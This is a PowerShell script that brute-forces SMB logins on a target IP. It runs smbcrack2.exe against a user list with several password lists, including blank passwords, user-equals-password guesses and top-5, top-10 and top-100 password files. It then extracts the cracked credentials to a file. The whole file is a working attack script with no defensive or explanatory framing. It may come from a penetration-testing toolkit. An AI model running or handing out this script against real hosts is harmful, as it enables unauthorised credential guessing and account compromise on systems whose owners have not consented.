$ProgressPreference = 'SilentlyContinue'

$global:target=$args[0]


function debug {
echo "target: $target"
echo "userlist: $userlist2"
echo "domain: $domain2"
echo "passlist: $passlist2"
}  



date 
####################################
# SMBCrack2 - https://sourceforge.net/projects/kcavepentrix/  cant be found in this iso
####################################
function smbcrack2-check-cracked {
Get-Content .\smbcrack2_brute.log | Select-String "Password:"  | sort-object| Get-Unique | Tee smbcrack2_cracked.txt
}

function smbcrack2-password {
Write-Output ""
Write-Output "[+] password"
Write-Output ""
.\smbcrack2.exe -i $target -u users.txt -p pass_password.txt -P 1 -N -v | Tee smbcrack2_brute.log
Write-Output ""
smbcrack2-check-cracked
}
function smbcrack2-pass5 {
Write-Output ""
Write-Output "[+] pass5.txt"
Write-Output ""
.\smbcrack2.exe -i $target -u users.txt -p pass5.txt -P 1 -N -v | Tee smbcrack2_brute.log
Write-Output ""
smbcrack2-check-cracked
}
function smbcrack2-userpass {
Write-Output ""
Write-Output "[+] user = pass"
Write-Output ""
.\smbcrack2.exe -i $target -u users.txt -p users.txt -P 1 -N -v | Tee smbcrack2_brute.log
Write-Output ""
smbcrack2-check-cracked
}
function smbcrack2-blank {
Write-Output ""
Write-Output "[+] pass_blank.txt"
Write-Output ""
.\smbcrack2.exe -i $target -u users.txt -p pass_blank.txt -P 1 -N -v | Tee smbcrack2_brute.log
Write-Output ""
smbcrack2-check-cracked
}
function smbcrack2-pass10 {
Write-Output ""
Write-Output "[+] pass10.txt"
Write-Output ""
.\smbcrack2.exe -i $target -u users.txt -p pass10.txt -P 1 -N -v | Tee smbcrack2_brute.log
Write-Output ""
smbcrack2-check-cracked
}
function smbcrack2-pass100 {
Write-Output ""
Write-Output "[+] pass100.txt"
Write-Output ""
.\smbcrack2.exe -i $target -u users.txt -p pass100.txt -P 1 -N -v | Tee smbcrack2_brute.log
Write-Output ""
smbcrack2-check-cracked
}





if ($target) { 
echo "" > .\smbcrack2_brute.log
smbcrack2-password
smbcrack2-pass5
smbcrack2-userpass
smbcrack2-blank
smbcrack2-pass10
smbcrack2-pass100
} else {
Write-Host "USEAGE: " 
Write-Host "	./brute_smbcrack2_cs2.ps1 [IP ADDRESS]" 
Write-Host "" 
Write-Host "" 
}



#debug
